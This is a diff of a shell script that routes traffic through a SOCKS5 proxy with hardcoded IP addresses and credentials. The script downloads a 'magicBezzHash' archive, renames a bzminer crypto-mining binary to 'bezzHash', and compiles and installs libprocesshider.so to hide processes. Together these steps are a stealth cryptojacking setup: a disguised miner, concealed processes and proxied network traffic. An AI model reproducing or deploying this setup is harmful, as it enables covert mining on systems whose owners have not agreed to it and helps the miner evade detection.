@@ -23,9 +23,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 143.198.88.129:443
-socks5_username = ubed
-socks5_password = uye
+socks5 =  128.199.222.68:443
+socks5_username = arema
+socks5_password = singoedan
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -49,6 +49,8 @@ echo " "
 
 ./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
+mv bzminer bezzHash
+sudo ph add bezzHash
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
